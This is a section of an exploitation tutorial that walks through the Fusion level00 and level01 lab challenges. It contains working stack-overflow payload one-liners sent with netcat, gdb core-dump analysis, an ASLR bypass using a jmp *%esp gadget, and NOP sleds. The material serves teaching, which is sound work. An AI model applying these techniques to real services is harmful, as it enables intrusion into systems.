\subsection{ASLR}

One of the earliest responses to exploits is Address Space Layout Randomization (ASLR).
Introduced in 2001 in PaX, the goal of ASLR is to make successful exploitation
of a vulnerability more difficult by introducing entropy into addresses
of the stack, heap, functions, and shared objects. If we re-examine
the work we've done so far, we'll notice that we're pretty reliant
on knowing precisely where various things are. For example, to get code
execution we need to both store our shellcode somewhere in the
process' memory space, and know the address it is stored at, so
we can jump to it and redirect execution While we can still
rely on there being a fixed number of bytes from the beginning of
a vulnerable buffer until the stored return address, we'll quickly
notice that some things are moved around, and it's no longer
sufficient to simply overwrite the return pointer with the same constant.

As a demonstration, let's begin with a slightly more complicated, but
still doable, stack-based buffer overflow. This is still without
any protections, so it should be fairly straightforward. This is
\texttt{level00} on the \texttt{fusion} virtual machine from exploit-exercises.com.
This is designed to pick up where protostar left off, and introduce
more advanced concepts, such as exploit mitigations. We'll leave
further vm-specific information for later.

First, the scenario. Following is the important bits of the source 
from exploit-exercises.com:

\lstinputlisting[language=C]{stack/fusion_level00.c}

It's a bit more complicated, but not too bad once we get down to it.
Basically, this program hosts a psuedo-http server. It's not
actually http-compliant at all, but at least forces you to try
and pretend. It listens for connections on a socket, and will
helpfully tell visitors the address of its internal buffer.
After a read from the socket it will parse the input, making
sure it at least sort of looks like an http GET request, then
pass a portion to the \texttt{fix\_path} function. This is where 
things get interesting, as we see that this function
has a 128-byte buffer that it calls a \texttt{strcpy} on! This
is bad. Alright, so we think we've found a vulnerability. Let's 
start experimenting. We can find this program listening on
port 20000 of the virtual machine. using \texttt{fusion}:\texttt{godmode}
to log in (and remembering root's password is also \texttt{godmode}), we
can take advantage of core dumps in reversing this exploit.
First, let's send 200 bytes. Since this has a decent chance of 
overwriting the return pointer, we'll pattern it to help us 
determine memory layout. This can be done with a simple python script
and netcat.

\begin{lstlisting}
buf = []
for i in range(0x41,0x4c):
			buf.append(chr(i)*20)
			print ''.join(buf)
\end{lstlisting}

Using the pre-3.0 python on fusion, we take 20 copies of the first
10 letters each, and append them all together. This gives a nice, 
simple buffer we can just copy/paste:
\begin{lstlisting}
fusion@fusion:~/level00\$ python buf.py 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKK
\end{lstlisting}

So, testing is as simple as sending a properly formatted buffer with netcat,
and examining the core dump \texttt{/core}. If this file exists already,
you should delete it with \texttt{rm} before making another. Of course, we'll
also want to execute \texttt{ulimit -c unilimited} to allow coredumps unilmited
in size

\begin{lstlisting}
fusion@fusion:~/level00\$ nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
GET AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKK HTTP/1.1
fusion@fusion:~/level00\$ sudo gdb -q --core /core
[New LWP 3042]
Core was generated by `/opt/fusion/bin/level00'.
Program terminated with signal 11, Segmentation fault.
#0  0x48484847 in ?? ()
\end{lstlisting}

Excellent! the return pointer happened to be directly on a boundary.
Remembering how the buffer was crafted (increasing order), and the
little-endianness of our intel machine, then we know that
the return address is directly where ``\texttt{GHHH}" is in our buffer.
To further verify this, we can craft another buffer with a specific value where
we expect the return pointer to be, send it to the server, then check
the coredump. Remember that we'll need to remove the coredump \texttt{/core}
before crashing the program again, as otherwise it won't be overwritten.

\begin{lstlisting}
fusion@fusion:~\$ sudo rm /core
fusion@fusion:~\$ python -c 'print "GET " + "A"*139 + "\xf3\xf2\xf1\xf0" + " HTTP/1.1\n"' | nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
\end{lstlisting}

Here, we place the bytes \texttt{0xf0f1f2f3} where we expect the return pointer to be;
139 bytes after the beginning of our ``path" buffer. Thus, if this
is the right location, we'll see that our coredump will have been
generated after a segfault trying to access \texttt{0xf0f1f2f3}.
As we can see, this is indeed the case:

\begin{lstlisting}
fusion@fusion:~\$ sudo gdb -q --core /core
[New LWP 1901]
Core was generated by `/opt/fusion/bin/level00'.
Program terminated with signal 11, Segmentation fault.
#0  0xf0f1f2f3 in ?? ()
\end{lstlisting}

So, we can quite easily crash the program, and by now we know the
next step is to redirect execution somewhere beneficial, such as
to some place in memory where we've stored some shellcode. However, 
the current portion of the buffer we're using is passed to
a \texttt{realpath(path, resolved)} function on line 7 of 
the source, which is in the function where our actual overflow happens. Playing
it safe, we'll assume this function is valid in checking that a
given string could possibly represent a file, meaning we probably
won't get away with putting non-printable characters in here, 
something very difficult to avoid when trying to represent instructions.
It is technically possible to construct valid shellcode using
only printable/readable characters\footnote{http://www.blackhatlibrary.net/Ascii\_shellcode},
but this is definitely out of the scope of this paper.

Going back over the source, we do notice an opportunity. The
\texttt{parse\_http\_request} function receives our full buffer,
checks psuedo-http compliance, then passes a portion of our
full buffer to the vulnerable \texttt{fix\_path} function. We 
already know that the vulnerable function's buffer is only
128 bytes, but the initial buffer we are placed in is a much
larger 1024 bytes. So, could we possibly places bytes after
the ``HTTP/1.1" portion of our buffer? Examining the compliance-checking
code on line 26, we see that our buffer is compared to make
sure it contains exactly ``HTTP/1.1", but as it only checks
8 characters, we could technically end our buffer with whatever
we want, so long as it begins with ``HTTP/1.1". Also worth noting
here is that the \texttt{read} function may
possibly read null bytes, which could make string processing 
interesting\footnote{such as when you use functions on binary data which assume it is a string: http://wiibrew.org/wiki/Signing\_bug},
but in this case likely won't cause problems.

So, if we were to place some bytes after ``HTTP/1.1", then not only
will this not ruin our psuedo-http compliance, but these bytes will
not be checked in any way, as our overflow bytes passed to \texttt{realpath(path, resolved)} were.
Let's explore this with the magical byte \texttt{0xcc}. According to
the Intel Manuals\footnote{TODO: add reference to intel manuals here}, this
is for the \texttt{INT 3} instruction, used by debuggers to set breakpoints.
To redirect execution to our test shellcode, we'll need to calculate it.
With some simple algebra, we simply add the number of characters
we've written to our buffer to the buffer's starting address. So, 
including the ``GET", overflow buffer and ``HTTP/1.1\textbackslash n", we have 157
bytes, giving a target address of \texttt{0xbffff8f8+157 = 0xbffff995},
assuming we jump to the byte immediately following the ``HTTP/1.1\textbackslash n".

\begin{lstlisting}
fusion@fusion:~/level00\$ python -c 'print "GET " + "A"*139 + "\x95\xf9\xff\xbf" + " HTTP/1.1\n" + "\xcc"*2' | nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
fusion@fusion:~/level00\$ sudo rm /core
fusion@fusion:~/level00\$ sudo gdb -q --core /core
[New LWP 2499]
Core was generated by `/opt/fusion/bin/level00'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbffff996 in ?? ()
\end{lstlisting}

Excellent! Noticing that we crashed because of an unhandled
breakpoint trap, and that the instruction pointer is immediately
after where we redirected to, we know that we have succesfully
redirected execution to our payload. All that is left is to
create a suitable payload for our purposes, and we have
a full exploit. 

This is nice, but nothing here strictly relates to ASLR. We
had some extra work in sending a buffer over the network while satisfying
certain conditions, but this was hardly a problem. More 
importantly, the address of the buffer, which is just given
to us, does not change between executions as it would under ASLR.
This is why we move to the next challenge, \texttt{level01}. 
It is identical to the previous one, but with a form of ASLR, and 
won't give us hints. This way, we can borrow all of the work
we just did, but in adapting it to \texttt{level01}, focus
only on the ASLR-related aspects.

The challenge ASLR presents is in loading various sections of a 
program at different addresses each run. While in previous examples
we could overwrite the return pointer with a fixed value and reliably
jump into our shellcode, with ASLR this becomes a guessing game.
This attacks the assumption we used earlier that specific variables
and data would be located at the same locations between program
executions. Without being able to know where certain things are, 
such as the buffer we fill, jumping to our shellcode becomes a
challenge. However, there are many techniques to bypass
ASLR, and the only realy limit is your creativity within the
situation of the vulnerability.

One method of bypassing ASLR is by leveraging some sort of
information leak bug. In the previous example, we were told
exactly where our buffer was. If we had something similar here, 
then we could simply use that to deduce where the stack was
mapped, and where our buffer would be. If ASLR depends on the 
attacker not knowing (or being able to predict) addresses, 
then an information leak would easily defeat it.

Another large family of techniques is code reuse. First recognized
as ``ret2libc" style attacks, the idea here is to reuse code
which is already present to do what you wish. This would be 
more beneficial in bypassing memory pages marked as non-executable,
but if the ASLR is incompletely applied, it can be used to bypass
ASLR. For example, it's possible that the stack and heap are both
mapped dynamically, but shared objects or the \texttt{.text} section are not.
Then, instead of stuffing shellcode in a buffer and wondering where
precisely it wound up, we can just take advantage of fixed
addresses in a shared object, or program code. One example of this
is in a typical ``ret2libc" style attack. Once we have some
sort of buffer overflow that lets us overwrite the return pointer,
we see what sorts of functions the program has access to, either
within itself or through shared objects such as the c library.
Assuming we target the C library, we can simply choose to redirect
execution to a function such as \texttt{system()} or \texttt{execve()}
by overwriting the return pointer with the address of the function.
All that would be left is to place values on the stack 
for a call to such a function to do what we want, such as
launching a new process. If the code is loaded in a predictable, 
non-ASLR fashion, then these addresses are predictable, and
we avoid really having to deal with ASLR directly. Taking the concept
of code re-use even further, it's possible to chain together
execution of multiple snippets of code to get much more flexibility
in what we can do, at the cost of higher complexity. Commonly known
as Return Oriented Programming (ROP), this technique is out of the 
scope of this paper.

Back to the challenge at hand, let's simply try our code blindly
and see what happens. We know the program is largely the same, 
so let's see how far the old tricks get us.

\begin{lstlisting}
fusion@fusion:~\$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x95\xf9\xff\xbf" + " HTTP/1.1\n" + "\xcc"*2' | nc localhost 20001
fusion@fusion:~\$ sudo gdb -q --core /core
[New LWP 1302]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffff995 in ?? ()
(gdb) i r esp
esp            0xbfe9f490       0xbfe9f490
\end{lstlisting}

Alright, so we still redirect execution as expected, but we
didn't crash on a breakpoint trap like last time. Instead we
just die with a typical segfault. Comparing our instruction
pointer with our stack pointer, it becomes clear what's happened:
we're not jumping to where our shellcode is! In fact, since
the stack grows down, we aren't even jumping into the stack of the function!

So now, we have to deal with this challenge's psuedo-ASLR\footnote{I say psuedo because i've yet to see the stack pointer change between executions. While the fusion VM certainly has ASLR enabled, and the stack pointer changes after a reboot, something's not quite right in however ASLR was implemented on this challenge.}.
Taking the lead of Matt Andreko\footnote{http://www.mattandreko.com/2012/07/exploit-exercises-fusion-01.html},
we will use some code reuse to insulate ourselves from having to deal with
addresses. Let's do some more exploring with our coredump:

\begin{lstlisting}
fusion@fusion:~\$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x95\xf9\xff\xbf" + " HTTP/1.1\n" + "\xcc"*2' | nc localhost 20001
fusion@fusion:~\$ sudo gdb -q --core /core
[New LWP 2146]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffff995 in ?? ()
(gdb) i r
eax            0x1      1
ecx            0xb76d98d0       -1217554224
edx            0xbfe9f490       -1075186544
ebx            0xb7851ff4       -1216012300
esp            0xbfe9f490       0xbfe9f490
ebp            0x41414141       0x41414141
esi            0xbfe9f544       -1075186364
edi            0x8049ed1        134520529
eip            0xbffff995       0xbffff995
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/x \$esi
0xbfe9f544:     0x0acccc0a
(gdb) x/x \$edx
0xbfe9f490:     0xbfe9f400
(gdb) x/x 0xbfe9f400
0xbfe9f400:     0x4141412f
(gdb) x/16x 0xbfe9f400-8
0xbfe9f3f8:     0x080484fc      0x00000200      0x4141412f      0x41414141
0xbfe9f408:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfe9f418:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfe9f428:     0x41414141      0x41414141      0x41414141      0x41414141
\end{lstlisting}

Looking at the registers, we note that \texttt{esp} is \texttt{0xbfe9f490},
so other registers with values beginning in \texttt{0xbfe9} are likely 
pointing to something on the function's stack, and are worth investigating.
The only other registers nearby are \texttt{esi} and \texttt{edx}. Investigating
these, we see that \texttt{edx} appears to be a character pointer. Though
obviously involved, it's not clear how we could use this to our advantage.
However, \texttt{esi} has some interesting data where it's pointing.
Using the memory examination command, we have \texttt{0x0acccc0a}, which would
be our two breakpoint traps surrounded by newlines. It seems as if
the \texttt{esi} register were used in some previous string comparison, and
now is pointing right after the ``HTTP/1.1" in our buffer. Using code reuse,
if the program had a \texttt{jmp *\%esi} instruction anywhere, then we 
could probably jump straight into our shellcode with some minor tweaking.
In fact, if we remove the newline between ``HTTP/1.1" and our shellcode,
we see that it no longer appears where \texttt{esi} is pointing.

\begin{lstlisting}
fusion@fusion:~\$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x95\xf9\xff\xbf" + " HTTP/1.1" + "\xcc"*2' | nc localhost 20001
[sudo] password for fusion: 
fusion@fusion:~\$ sudo gdb -q --core /core
[New LWP 2252]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffff995 in ?? ()
(gdb) x/x \$esi
0xbfe9f544:     0x000acccc
\end{lstlisting}

Alright, so we don't actually have to worry about a newline screwing up any of our
shellcode. At this point, we have a register that is pointing directly
into our shellcode when we redirect execution. Naturally, we should
see if there's any instructions jumping to where this register points.
To start with, let's see exactly what parts of our file are executable,
that way we know where potential instructions may be.

\begin{lstlisting}
fusion@fusion:~\$ ps aux | grep level01
20001      922  0.0  0.1   1816   260 ?        Ss   14:03   0:00 /opt/fusion/bin/level01
fusion    3138  0.0  0.3   4184   804 pts/0    S+   19:21   0:00 grep --color=auto level01
fusion@fusion:~\$ sudo cat /proc/922/maps
08048000-0804b000 r-xp 00000000 08:01 74967      /opt/fusion/bin/level01
0804b000-0804c000 rwxp 00002000 08:01 74967      /opt/fusion/bin/level01
b76d9000-b76da000 rwxp 00000000 00:00 0 
b76da000-b7850000 r-xp 00000000 08:01 1254       /lib/i386-linux-gnu/libc-2.13.so
b7850000-b7852000 r-xp 00176000 08:01 1254       /lib/i386-linux-gnu/libc-2.13.so
b7852000-b7853000 rwxp 00178000 08:01 1254       /lib/i386-linux-gnu/libc-2.13.so
b7853000-b7856000 rwxp 00000000 00:00 0 
b785c000-b785e000 rwxp 00000000 00:00 0 
b785e000-b785f000 r-xp 00000000 00:00 0          [vdso]
b785f000-b787d000 r-xp 00000000 08:01 1251       /lib/i386-linux-gnu/ld-2.13.so
b787d000-b787e000 r-xp 0001d000 08:01 1251       /lib/i386-linux-gnu/ld-2.13.so
b787e000-b787f000 rwxp 0001e000 08:01 1251       /lib/i386-linux-gnu/ld-2.13.so
bfe7f000-bfea0000 rwxp 00000000 00:00 0          [stack]
\end{lstlisting}
Alright, so our binary is mapped in two regions, \texttt{08048000-0804b000}
and \texttt{0804b000-0804c000}, both of which are executable. Likewise,
both the \texttt{libc-2.13.so} and \texttt{ld-2.13.so} objects are
mapped executable. Now,
the most straightforward way to get to our shellcode would be a 
\texttt{jmp *\%esi} instruction. However, searching through
our binary doesn't turn up any such instruction.

\begin{lstlisting}
fusion@fusion:~$ sudo gdb -q /opt/fusion/bin/level01
Reading symbols from /opt/fusion/bin/level01...done.
(gdb) b main
Breakpoint 1 at 0x8049983: file level01/level01.c, line 40.
(gdb) r
Starting program: /opt/fusion/bin/level01 

Breakpoint 1, main (argc=1, argv=0xbfc94c54, envp=0xbfc94c5c) at level01/level01.c:40
40      level01/level01.c: No such file or directory.
        in level01/level01.c
(gdb) find /h 0x08048000, 0x0804b000, 0xe6ff
Pattern not found.
\end{lstlisting}

Here, we use gdb's \texttt{find} command to search the addresses
that we know our binary is loaded at for a \texttt{jmp *\%esi} command.
the \texttt{/h} indicates our pattern is a half-word (16 bits),
and the \texttt{0xe6ff} are the two bytes representing the opcode for
\texttt{jmp *\%esi}, in reversed order (little-endian).
So, we'll have to be a bit more creative if we want to redirect
execution to where the \texttt{esi} register is pointing.
Well, perhaps we won't find this instruction in the binary itself,
but in one of the shared objects it imports.

\begin{lstlisting}
(gdb) info proc mappings
process 3892
cmdline = '/opt/fusion/bin/level01'
cwd = '/home/fusion'
exe = '/opt/fusion/bin/level01'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
          0x1f4000   0x1f5000     0x1000          0           [vdso]
          0x6ef000   0x6f1000     0x2000          0        
          0x82d000   0x82e000     0x1000          0        
          0xa98000   0xc0e000   0x176000          0        /lib/i386-linux-gnu/libc-2.13.so
          0xc0e000   0xc10000     0x2000   0x176000        /lib/i386-linux-gnu/libc-2.13.so
          0xc10000   0xc11000     0x1000   0x178000        /lib/i386-linux-gnu/libc-2.13.so
          0xc11000   0xc14000     0x3000          0        
          0xdb4000   0xdd2000    0x1e000          0        /lib/i386-linux-gnu/ld-2.13.so
          0xdd2000   0xdd3000     0x1000    0x1d000        /lib/i386-linux-gnu/ld-2.13.so
          0xdd3000   0xdd4000     0x1000    0x1e000        /lib/i386-linux-gnu/ld-2.13.so
         0x8048000  0x804b000     0x3000          0       /opt/fusion/bin/level01
         0x804b000  0x804c000     0x1000     0x2000       /opt/fusion/bin/level01
        0xbfc75000 0xbfc96000    0x21000          0           [stack]
(gdb) find /h 0xa98000, 0xc0e000, 0xe6ff
0xb0c681 <mallochook+49>
...
0xbf7fcb
17 patterns found.
(gdb) x/i 0xb0c681
   0xb0c681 <mallochook+49>:    jmp    *%esi
\end{lstlisting}

Excellent! so, the bytes for a \texttt{jmp *\%esi} instruction
can be found in the C standard library. We'd be tempted to redirect
execution to that address and be done, but there's a few problems.
First, the address contains a null byte (\texttt{0x00b0c681}), and
may not get through string functions properly. Also, how well does this
work if we were to re-start the process?

\begin{lstlisting}
(gdb) quit
A debugging session is active.

        Inferior 1 [process 3892] will be killed.

Quit anyway? (y or n) y
fusion@fusion:~$ sudo gdb -q /opt/fusion/bin/level01
Reading symbols from /opt/fusion/bin/level01...done.
(gdb) b main
Breakpoint 1 at 0x8049983: file level01/level01.c, line 40.
(gdb) r
Starting program: /opt/fusion/bin/level01 

Breakpoint 1, main (argc=1, argv=0xbf99ff64, envp=0xbf99ff6c) at level01/level01.c:40
40      level01/level01.c: No such file or directory.
        in level01/level01.c
(gdb) x/i 0xb0c681
   0xb0c681 <free_mem+273>:     xchg   %eax,%esp
(gdb) info proc mappings
process 4203
cmdline = '/opt/fusion/bin/level01'
cwd = '/home/fusion'
exe = '/opt/fusion/bin/level01'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
          0x4b4000   0x4b5000     0x1000          0        
          0x82c000   0x82d000     0x1000          0           [vdso]
          0x9e8000   0xb5e000   0x176000          0        /lib/i386-linux-gnu/libc-2.13.so
          0xb5e000   0xb60000     0x2000   0x176000        /lib/i386-linux-gnu/libc-2.13.so
          0xb60000   0xb61000     0x1000   0x178000        /lib/i386-linux-gnu/libc-2.13.so
          0xb61000   0xb64000     0x3000          0        
          0xc4b000   0xc4d000     0x2000          0        
          0xe5b000   0xe79000    0x1e000          0        /lib/i386-linux-gnu/ld-2.13.so
          0xe79000   0xe7a000     0x1000    0x1d000        /lib/i386-linux-gnu/ld-2.13.so
          0xe7a000   0xe7b000     0x1000    0x1e000        /lib/i386-linux-gnu/ld-2.13.so
         0x8048000  0x804b000     0x3000          0       /opt/fusion/bin/level01
         0x804b000  0x804c000     0x1000     0x2000       /opt/fusion/bin/level01
        0xbf980000 0xbf9a1000    0x21000          0           [stack]
\end{lstlisting}

We quit gdb, killing the process, then restart our debugging session.
Immediately after the breakpoint, we check the location we
expect our \texttt{jmp *\%esi} instruction to be at, and are dismayed
to find it now holds a \texttt{xchg \%eax,\%esp} instruction. It seems
that ASLR has foiled our dastardly plans again, as we can see that
the shared objects we were interested in have been mapped at different locations.
This effectively kills any hope we had of reusing code in
shared objects, but there is a bit of hope once we notice that
the binary file is still mapped at \texttt{0x08048000}.

So, we can't look to shared objects for code reuse, but the binary
file itself is still fair game. However, it didn't contain any
\texttt{jmp *\%esi} instructions. One alternative instruction
combination could be \texttt{push \%esi; ret}, but this isn't found
in our binary file either. After some more research, we notice
another opportunity. The stack pointer is pointing immediately
after the return pointer we are clobbering, meaning if we just
add a few bytes to our buffer after the return address, we
could possibly make use of the \texttt{esp} register.

\begin{lstlisting}
fusion@fusion:~$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x95\xf9\xff\xbf" + " HTTP/1.1" + "\xcc"*2' | nc localhost 20001
fusion@fusion:~$ sudo gdb -q --core /core
[New LWP 4902]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffff995 in ?? ()
(gdb) i r esp
esp            0xbfe9f490       0xbfe9f490
(gdb) x/4x $esp-8
0xbfe9f488:     0x41414141      0xbffff995      0xbfe9f400      0x00000020
(gdb) 
\end{lstlisting}

Well, perhaps there's a \texttt{jmp *\%esp} instruction? we already know
we can't jump to wherever \texttt{esi} is pointing, but maybe we can
put some instructions after our return address and jump to \texttt{esp}.

\begin{lstlisting}
fusion@fusion:~$ sudo gdb -q /opt/fusion/bin/level01
Reading symbols from /opt/fusion/bin/level01...done.
(gdb) b main
Breakpoint 1 at 0x8049983: file level01/level01.c, line 40.
(gdb) r
Starting program: /opt/fusion/bin/level01 

Breakpoint 1, main (argc=1, argv=0xbf8cccf4, envp=0xbf8cccfc) at level01/level01.c:40
40      level01/level01.c: No such file or directory.
        in level01/level01.c
(gdb) find /h 0x08048000, 0x0804b000, 0xe4ff
0x8049f4f
1 pattern found.
\end{lstlisting}

Here, we load the program into memory, place a breakpoint at
main so we can pause execution once everything's loaded,
and search for a \texttt{jmp *\%esp} instruction, which assembles
to \texttt{0xff 0xe4}. Luckily, we find one! At this point, we
know the binary file itself is loaded to a static address
on each execution, so this instruction will be in the same location
on each execution. As it jumps to \texttt{esp}, which is immediately
after the clobbered return address, we have a few bytes worth of
instructions we can place to be executed. Let's try this.

\begin{lstlisting}
fusion@fusion:~$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x4f\x9f\x04\x08" + "\xcc\xcc\xcc\xcc" +  " HTTP/1.1" + "\xcc"*2' | nc localhost 20001
fusion@fusion:~$ sudo gdb -q --core /core
[New LWP 1294]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbf8d19e1 in ?? ()
(gdb) i r esp
esp            0xbf8d19e0       0xbf8d19e0
(gdb) x/4x $eip-5
0xbf8d19dc:     0x08049f4f      0xcccccccc      0x00000000      0x00000004
\end{lstlisting}

Excellent, it worked! We can see in the coredump that we
were killed on one of our breakpoint traps \texttt{0xcc},
and from comparing \texttt{eip} with \texttt{esp}, we
know that clobbering the return address with the address
of the \texttt{jmp *\%esp} instruction we found worked. Using
\texttt{x}, we view the memory around \texttt{eip}, seeing
our 4 breakpoint traps, and the overwritten return address.

So, now we can reliably jump to instructions we control again.
Because we initially wanted to get our old exploit working for
the new case of ASLR, let's add as little as possible to our
existing exploit. Since the bytes we can jump to using
this \texttt{jmp *\%esp} instruction are part of a string
which is supposed to represent a filename, we should
(theoretically) be careful about what bytes we use. This
worked because \texttt{0xcc} is also the printable character ``Ì",
and luckily enough, the \texttt{jmp *\%esi} instruction we
wanted in the first place also assembles to printable characters
``ÿä". So, if we simply place a \texttt{jmp *\%esi} instruction
after our return address, we should jump back to our original shellcode
location after the ``HTTP/1.1".

\begin{lstlisting}
fusion@fusion:~$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x4f\x9f\x04\x08" + "\xff\xe6" +  " HTTP/1.1" + "\xcc"*2 + "\xf0"*2' | nc localhost 20001
fusion@fusion:~$ sudo gdb -q --core /core
[New LWP 1563]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbf8d1a97 in ?? ()
(gdb) i r esi
esi            0xbf8d1a96       -1081271658
(gdb) x/4b $eip-1
0xbf8d1a96:     0xcc    0xcc    0xf0    0xf0
\end{lstlisting}

Success! we place the opcode for \texttt{jmp *\%esi} immediately
after our return address. We return to the \texttt{jmp *\%esp}
instruction discovered earlier.

This code reuse technique relied on ASLR not being fully applied
to the binary, which may not always be the case. Another option,
though less elegant, is to use a NOP sled. If we're stuck guessing
addresses our shellcode is at, it's possible to use a NOP sled
to increase the probability that a guessed address would lead
to execution of our shellcode, instead of a segfault. Essentially,
we prepend our shellcode with bytes which, when interpreted as
instructions, will not affect the execution of our shellcode.
This way instead of jumping precisely to the beginning of our
shellcode, we only have to jump to some range of bytes immediately
before our shellcode. This is easiest to demonstrate with the standard
NOP instruction, which is the single byte \texttt{0x90}, but many combinations
of instructions can serve as nops. The primary downside to this technique
is that we're still making guesses of the address, but it can be very
useful in combination with other things, such as a partial information leak.

\begin{lstlisting}
fusion@fusion:~$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\x94\x1a\x8d\xbf" +  " HTTP/1.1" + "\x90"*867 +"\xcc"' | nc localhost 20001
fusion@fusion:~$ sudo gdb -q --core /core                                                                                                      [New LWP 2047]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbf8d1df8 in ?? ()
(gdb) q
fusion@fusion:~$ sudo rm /core; python -c 'print "GET " + "A"*139 + "\xf7\x1d\x8d\xbf" +  " HTTP/1.1" + "\x90"*867 +"\xcc"' | nc localhost 20001
fusion@fusion:~$ sudo gdb -q --core /core                                                                                                      [New LWP 2109]
Core was generated by `/opt/fusion/bin/level01'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbf8d1df8 in ?? ()
\end{lstlisting}

From our code snippet, we know that our string is being read into
a 1024-byte buffer. Some simple math (1024 - 157 = 867) lets us determine
how many spare bytes we have to work with, assuming we only overflow
up to the return address, have the required ``GET" and ``HTTP/1.1",
and have the 1-byte breakpoint trap as our shellcode. So, we
just put that many NOP instructions (as they are 1 byte) before our
breakpoint trap. As demonstrated in the code snippet, this gives us
an 867-byte window of valid guesses.
For this execution, anything guessed between \texttt{0xbf8d1a94}
and \texttt{0xbf8d1df7} would lead to proper execution of our payload.
Taking the average, we'd want to try an address of \texttt{0xbf8d1c45}.
This way if the ASLR in another instance mapped things to within 433 bytes
of this instance, our exploit would still execute our breakpoint trap payload.

It should be noted that performing this latest example demonstrates that
the \texttt{level01} does not fully implement ASLR as we expect it. Standard
behavior of ASLR on linux is to randomize addresses when the program is
loaded into memory. However, each time we perform the exploit, the address our
buffer is at doesn't actually change. Rebooting the virtual machine will
cause addresses to change, but crashing the program won't. As we will
see in the Heap section, these challenges from \texttt{exploit-exercises.com}
are usually slightly different from how they are presented in source
snippets. It seems to be the norm for challenges which are introducing new
concepts to be made somewhat less complicated and somewhat easier, probably
to make them less discouraging. So, while this challenge is technically
passable without having to deal with ASLR, a reliable exploit will indeed
need to confront it somehow.
